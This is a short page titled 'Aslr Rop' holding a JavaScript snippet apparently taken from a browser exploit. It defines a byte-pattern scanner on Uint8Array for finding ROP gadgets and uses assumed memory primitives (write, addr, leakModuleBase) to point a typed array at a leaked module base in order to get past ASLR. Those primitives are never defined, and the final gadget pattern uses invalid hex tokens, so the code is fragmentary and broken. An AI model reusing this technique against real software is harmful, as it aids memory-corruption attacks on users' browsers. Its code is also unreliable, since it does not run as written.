---
title: Aslr Rop
---

```javascript
Uint8Array.prototype.rop = function(t) {
 function d(r,o,p) {
  if (r!=t[0]) return 0;
  for (q=0;q<t.length;q++) {
    if (undefined==t[q]) continue;
    if (p[o+q]!=t[q]) return 0; 
  }
  return 1; }
 return this.findIndex(d);
}
module = new Uint8Array(0x370000)
write( addr(module)+slots, leakModuleBase() )
rop1 = module.rop([0xe8, ,,,, 0xcc])
rop3 = module.rop([c0, 01, ce, ff, c3, 01])
```